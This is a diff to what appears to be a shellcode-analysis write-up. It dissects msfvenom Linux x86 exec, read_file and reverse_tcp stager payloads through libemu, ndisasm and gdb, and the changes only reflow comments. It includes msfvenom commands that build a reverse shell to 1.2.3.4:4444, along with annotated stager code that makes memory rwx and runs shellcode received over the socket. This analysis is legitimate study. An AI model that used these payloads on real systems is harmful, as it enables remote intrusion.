@@ -14,12 +14,14 @@ i choose to analyze both basic commands and one reverse shell, the command i use
     sctest -vvv -S -s 99999 -G exec.dot < exec
     dot -Tjpg exec.dot > exec.jpg
 
+
     msfvenom -p linux/x86/read_file PATH=/etc/hosts -f c > readfile.c
     msfvenom -p linux/x86/read_file PATH=/etc/hosts -f raw > readfile.raw
     msfvenom -p linux/x86/read_file PATH=/etc/hosts > readfile
     chmod +x readfile
     sctest -vvv -S -s 99999 -G readfile.dot < readfile
     dot -Tjpg readfile.dot > readfile.jpg
+
 
     msfvenom -p linux/x86/shell/reverse_tcp_uuid LHOST=1.2.3.4 LPORT=4444 -f c > reverse.c
     msfvenom -p linux/x86/shell/reverse_tcp_uuid LHOST=1.2.3.4 LPORT=4444 -f raw > reverse.raw
@@ -41,12 +43,14 @@ ndisasm -u exec output and comments:
     00000003  99                cdq                                        ; because eax is not negative, fills edx with 0
     00000004  52                push edx                                   ; push 0x0 to esp (string terminator maybe?)
     00000005  66682D63          push word 0x632d                           ; push -c to the stack
-    00000009  89E7              mov edi,esp                                ; move esp pointer to edi, i guess this will be an execve argument
+    00000009  89E7              mov edi,esp                                ; move esp pointer to edi, i guess this will be
+                                                                           ; an execve argument
     0000000B  682F736800        push dword 0x68732f                        ; push hs/ (/sh)
     00000010  682F62696E        push dword 0x6e69622f                      ; push nib/ (/bin/)
     00000015  89E3              mov ebx,esp                                ; move esp pointer to ebx, esp holds: /bin/sh
     00000017  52                push edx                                   ; push 0x0 because edx was nulled at 0x3
-    00000018  E80C000000        call 0x29                                  ; i liked a lot this call because it jumps to a non aligned code, fooling ndisasm and gdb
+    00000018  E80C000000        call 0x29                                  ; i liked a lot this call because it jumps to a
+                                                                           ; non aligned code, fooling ndisasm and gdb
     0000001D  2F                das                                        ; from here, useless junk until 0x29
     0000001E  7573              jnz 0x93
     00000020  722F              jc 0x51
@@ -58,8 +62,8 @@ ndisasm -u exec output and comments:
 moving to gdb, i set 05_shellcode.c to include exec.c, compiled and runt with b *&buf  
 i know that the call is at 0x29 from buf, so i take buf starting address
 in gdb and add 0x29: "offending" code is at 0x56559069
-because gdb/GEF can also print instruction, i just use x/i to see the
-code:
+because gdb/GEF can also print instruction, i just use x/i to see the code
+
     gef➤  x/4i 0x56559069
        0x56559069 <buf+41>: push   edi
        0x5655906a <buf+42>: push   ebx
@@ -93,12 +97,14 @@ libemu wasn't able to emulate anything here, i'll dig as extra mile in
 the near future.
 back to gdb/ndisasm, this is ndisasm -u readfile output with some
 comment ordered to follow the flow easily:
+
     00000000  EB36              jmp short 0x38          ; 1) cool, starting with a jump will surely simplify analysis...
     00000002  B805000000        mov eax,0x5             ; 3) eax => 0x5 , syscall open call
-    00000007  5B                pop ebx                 ; 4) using gdb i'll confirm this, i guess ebx will hold a filename
+    00000007  5B                pop ebx                 ; 4) gdb i'll confirm this, i guess ebx will hold a filename
     00000008  31C9              xor ecx,ecx
     0000000A  CD80              int 0x80                ; 5) do the actual call
-    0000000C  89C3              mov ebx,eax             ; 6) because syscall place retcode in eax, and for open it's the fd, he saves it to ebx
+    0000000C  89C3              mov ebx,eax             ; 6) because syscall place retcode in eax, and for open it's the
+                                                        ; fd, he saves it to ebx
     0000000E  B803000000        mov eax,0x3             ; 7) eax => 0x3 , if it will be used as a syscall would be read
     00000013  89E7              mov edi,esp             ;
     00000015  89F9              mov ecx,edi             ; 9) read wants a fd as input and a place to store read data
@@ -111,8 +117,10 @@ comment ordered to follow the flow easily:
     0000002C  B801000000        mov eax,0x1
     00000031  BB00000000        mov ebx,0x0
     00000036  CD80              int 0x80                ;12) clean exit
-    00000038  E8C5FFFFFF        call 0x2                ; 2) ok, this time the code is aligned and i see what's going on. looks like jmp-call-pop technique
-    0000003D  2F                das                     ;13) from here we could see read filename => 2F6574632F686F737473 => /etc/hosts
+    00000038  E8C5FFFFFF        call 0x2                ; 2) ok, this time the code is aligned and i see what's going on
+                                                        ; looks like jmp-call-pop technique
+    0000003D  2F                das                     ;13) by concatenating hex from here we could see read filename
+                                                        ; 2F6574632F686F737473 => /etc/hosts
     0000003E  657463            gs jz 0xa4
     00000041  2F                das
     00000042  686F737473        push dword 0x7374736f
@@ -139,13 +147,15 @@ bytes.
 as you can see in reverse.jpg , the flow is quite basic: create a socket, connect, do something. i already developed my own revshell and i think i'm familiar with the flow, so fastly to ndisasm:
 
     00000000  6A0A              push byte +0xa
-    00000002  5E                pop esi                  ; put 0xa in esi, will use it to loop for reconnection in circa 0x2F
+    00000002  5E                pop esi                  ; put 0xa in esi, will use it to loop for reconnection in 0x2F
     00000003  31DB              xor ebx,ebx
-    00000005  F7E3              mul ebx                  ; multiply ebx and eax, and put result in eax+edx. result in zeroing both eax and edx, because ebx has been zeroed in 0x3
+    00000005  F7E3              mul ebx                  ; multiply ebx and eax, and put result in eax+edx. result in
+                                                         ; zeroing both eax and edx, because ebx has been zeroed in 0x3
     00000007  53                push ebx
     00000008  43                inc ebx
     00000009  53                push ebx
-    0000000A  6A02              push byte +0x2           ; i remember doing almost the same 4 instruction to have 0,1,2  on the stack, which is common arg for a tcp reverse shell
+    0000000A  6A02              push byte +0x2           ; i remember doing almost the same 4 instruction to have 0,1,2
+                                                         ; on the stack, which is common arg for a tcp reverse shell
     0000000C  B066              mov al,0x66              ; and here we have socketcall socket
     0000000E  89E1              mov ecx,esp              ; pointer to socket arg in ecx
     00000010  CD80              int 0x80                 ; create the socket
@@ -154,7 +164,8 @@ as you can see in reverse.jpg , the flow is quite basic: create a socket, connec
     00000013  5B                pop ebx                  ; top of stack is 0x2, put in ebx
     00000014  6801020304        push dword 0x4030201     ; for connect, we need an ip address, translated it's 1.2.3.4
     00000019  680200115C        push dword 0x5c110002    ; and a port, which is 0x5c11 => 0x115c => 4444
-                                                         ; this push breaks the nullbyte requirement but it's cute because puts both port and 0x2 to have the struct full
+                                                         ; this push breaks the nullbyte requirement but it's cute because
+                                                         ; puts both port and 0x2 to have the struct full
     0000001E  89E1              mov ecx,esp              ; put the pointer in ecx
     00000020  6A66              push byte +0x66
     00000022  58                pop eax                  ; in eax syscall for socketcall 0x66
@@ -167,8 +178,9 @@ as you can see in reverse.jpg , the flow is quite basic: create a socket, connec
     need 3 for the connect call
     00000029  CD80              int 0x80                 ; do the connect
     
-    0000002B  85C0              test eax,eax             ; 0x29 return will be in eax, if 0 connection has been completed. test eax,eax sets SIGN flag if eax is negative
-                                                         ; (most significant bit is >7f). will set SIGN to true if connect fails
+    0000002B  85C0              test eax,eax             ; 0x29 return will be in eax, if 0 connection has been completed
+                                                        ; test eax,eax sets SIGN flag if eax is negative (most significant
+                                                         ; bit is >7f). will set SIGN to true if connect fails
     0000002D  7944              jns 0x73                 ; if SIGN flag is not set, jumps to 0x73 which next "logic" step
     
     0000002F  4E                dec esi                  ; if connection fails, try "esi times", when esi is 0xa (10)
@@ -182,7 +194,8 @@ as you can see in reverse.jpg , the flow is quite basic: create a socket, connec
     0000003E  31C9              xor ecx,ecx
     00000040  CD80              int 0x80
     
-    00000042  85C0              test eax,eax             ; eax is 0 because of nanosleep, so next jmp should always occur - or not just if nanosleep fails someway
+    00000042  85C0              test eax,eax             ; eax is 0 because of nanosleep, so next jmp should always occurs
+                                                         ; or not just if nanosleep fails someway
     00000044  79BD              jns 0x3                  ; jmp to buf+3, which is almost the start of the program
     00000046  EB52              jmp short 0x9a           ; jmp to neat exit again
     
@@ -206,7 +219,8 @@ as you can see in reverse.jpg , the flow is quite basic: create a socket, connec
     00000071  59                pop ecx
     00000072  5B                pop ebx                  ; end of never-reached code?
     
-    00000073  B207              mov dl,0x7               ; 0x7 to dl doesn't say anything itself, seeing next syscall (0x7d at line 0x82) which is mprotect, we see that 0x7 will be "prot"
+    00000073  B207              mov dl,0x7               ; 0x7 to dl doesn't say anything itself, seeing next syscall at
+                                                         ; line 0x82, which is mprotect, we see that 0x7 will be "prot"
                                                          ; reading man mprotect we see that 0x7 means rwx
     00000075  B900100000        mov ecx,0x1000           ; and ecx will hold size len, so make a full page rwx
     0000007A  89E3              mov ebx,esp              ; move esp pointer to ebx, so mprotect knowns where to operate
@@ -216,15 +230,20 @@ as you can see in reverse.jpg , the flow is quite basic: create a socket, connec
     00000084  CD80              int 0x80
     
     00000086  85C0              test eax,eax             ; like at 0x2B
-    00000088  7810              js 0x9a                  ; but jumps to 0x9a (exit) if mprotect returns a negative number therefore an error
-    0000008A  5B                pop ebx                  ; reading backward, se see that esp has on top socketfd: put in ebx. we can see it's a read syscall so we expect it will read from the socket itself
-    0000008B  89E1              mov ecx,esp              ; put esp to ecx.  read needs a pointer to a writable location, this means it will write to esp what she reads from the socket
+    00000088  7810              js 0x9a                  ; but jumps to 0x9a (exit) if mprotect returns a negative number
+                                                         ; therefore an error
+    0000008A  5B                pop ebx                  ; reading backward, se see that esp has on top socketfd: put in
+                                                         ; ebx. we can see it's a read syscall so we expect it will read
+                                                         ; from the socket itself
+    0000008B  89E1              mov ecx,esp              ; put esp to ecx.  read needs a pointer to a writable location,
+                                                         ; this means it will write to esp what she reads from the socket
     0000008D  99                cdq                      ; eax is zero, so zero also edx to read unlimited bytes
     0000008E  B60C              mov dh,0xc               ; edx will be 0xc
     00000090  B003              mov al,0x3               ; read syscall
     00000092  CD80              int 0x80
     
-    00000094  85C0              test eax,eax             ; because eax holds retcode, if zero sign flag will be unset if read doesn't return any error
+    00000094  85C0              test eax,eax             ; because eax holds retcode, if zero sign flag will be unset if
+                                                         ; read doesn't return any error
     00000096  7802              js 0x9a                  ; exit if any error
     00000098  FFE1              jmp ecx                  ; jmp to received shellcode, executable because of mprotect
     
